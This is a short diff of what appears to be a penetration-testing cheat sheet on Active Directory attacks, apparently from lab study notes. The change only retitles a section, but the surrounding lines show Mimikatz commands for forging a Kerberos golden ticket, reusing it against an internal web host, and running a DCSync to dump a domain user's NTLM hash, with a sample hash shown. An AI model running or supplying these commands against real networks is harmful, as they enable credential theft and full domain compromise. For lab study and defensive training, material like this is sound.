@@ -98,7 +98,7 @@ kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com 
 klist
 iwr -UseDefaultCredentials http://web04   # it will work
 ```
-### Domain Controller Synchronization
+### Domain Controller Synchronization (DCsync attack)
 ```
 .\mimikatz.exe
 lsadump::dcsync /user:corp\dave         #   Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
